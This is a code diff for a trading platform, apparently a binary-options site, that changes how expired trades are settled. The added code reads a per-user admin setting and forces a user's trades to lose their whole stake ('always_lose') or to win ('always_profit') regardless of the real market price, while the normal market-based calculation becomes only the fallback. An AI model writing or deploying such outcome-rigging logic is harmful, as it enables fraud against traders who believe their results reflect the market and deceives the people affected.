@@ -20,11 +20,27 @@ def process_expired_trades():
         
         for trade in expired_trades:
             try:
+                # Get user and check trade control settings
+                user = User.query.get(trade.user_id)
+                trade_control = user.trade_control if user else 'normal'
+                
                 # Get current market price
                 current_price = market_data.get_real_price(trade.asset)
                 
-                # Calculate trade result
-                trade.calculate_result(current_price)
+                # Apply admin trade control overrides
+                if trade_control == 'always_lose':
+                    # Force trade to lose regardless of market price
+                    trade.status = 'lost'
+                    trade.exit_price = current_price
+                    trade.profit_loss = -trade.amount
+                elif trade_control == 'always_profit':
+                    # Force trade to win regardless of market price
+                    trade.status = 'won'
+                    trade.exit_price = current_price
+                    trade.profit_loss = trade.amount * (trade.payout_percentage / 100)
+                else:
+                    # Normal trading - calculate result based on market price
+                    trade.calculate_result(current_price)
                 
                 # Update user wallet if trade won
                 if trade.status == 'won':
